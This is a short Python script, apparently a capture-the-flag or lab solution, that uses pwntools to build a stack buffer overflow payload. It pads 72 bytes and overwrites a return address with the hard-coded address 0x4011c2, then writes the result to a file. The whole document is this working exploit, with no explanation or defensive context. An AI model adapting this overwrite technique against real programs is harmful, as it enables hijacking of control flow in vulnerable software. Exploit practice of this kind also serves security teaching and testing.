from pwn import *

payload = b'A'*64 + b'B'*8 + p64(0x4011c2)

with open("payload", "wb") as f:
    f.write(payload)
